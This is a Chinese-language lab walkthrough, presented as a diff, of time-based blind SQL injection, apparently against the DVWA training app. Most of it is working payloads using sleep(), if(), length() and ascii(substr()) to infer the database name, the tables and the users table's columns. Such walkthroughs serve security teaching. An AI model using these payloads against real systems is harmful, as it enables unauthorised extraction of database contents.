@@ -1,0 +1,39 @@
+1.判断是否存在注入，注入是字符型还是数字型
+输入1' and sleep(5) #，感觉到明显延迟；
+输入1 and sleep(5) #，没有延迟；
+说明存在字符型的基于时间的盲注。
+2.猜解当前数据库名
+首先猜解数据名的长度。
+1' and if(length(database())=1,sleep(5),1) # 没有延迟
+1' and if(length(database())=2,sleep(5),1) # 没有延迟
+1' and if(length(database())=3,sleep(5),1) # 没有延迟
+1' and if(length(database())=4,sleep(5),1) # 明显延迟
+说明数据库名长度为4个字符。接着采用二分法猜解数据库名。
+1' and if(ascii(substr(database(),1,1))>97,sleep(5),1)# 明显延迟
+…
+1' and if(ascii(substr(database(),1,1))<100,sleep(5),1)# 没有延迟
+1' and if(ascii(substr(database(),1,1))>100,sleep(5),1)# 没有延迟
+说明数据库名的第一个字符为小写字母d。
+…
+重复上述步骤，即可猜解出数据库名。
+3.猜解数据库中的表名
+首先猜解数据库中表的数量。
+1' and if((select count(table_name) from information_schema.tables where table_schema=database() )=1,sleep(5),1)# 没有延迟
+1' and if((select count(table_name) from information_schema.tables where table_schema=database() )=2,sleep(5),1)# 明显延迟
+说明数据库中有两个表。接着挨个猜解表名。
+1' and if(length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=1,sleep(5),1) # 没有延迟
+…
+1' and if(length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=9,sleep(5),1) # 明显延迟
+说明第一个表名的长度为9个字符。采用二分法即可猜解出表名。
+4.猜解表中的字段名
+首先猜解表中字段的数量。
+1' and if((select count(column_name) from information_schema.columns where table_name= ’users’)=1,sleep(5),1)# 没有延迟
+…
+1' and if((select count(column_name) from information_schema.columns where table_name= ’users’)=8,sleep(5),1)# 明显延迟
+说明users表中有8个字段。接着挨个猜解字段名。
+1' and if(length(substr((select column_name from information_schema.columns where table_name= ’users’ limit 0,1),1))=1,sleep(5),1) # 没有延迟
+…
+1' and if(length(substr((select column_name from information_schema.columns where table_name= ’users’ limit 0,1),1))=7,sleep(5),1) # 明显延迟
+说明users表的第一个字段长度为7个字符。采用二分法即可猜解出各个字段名。
+5.猜解数据
+同样采用二分法。
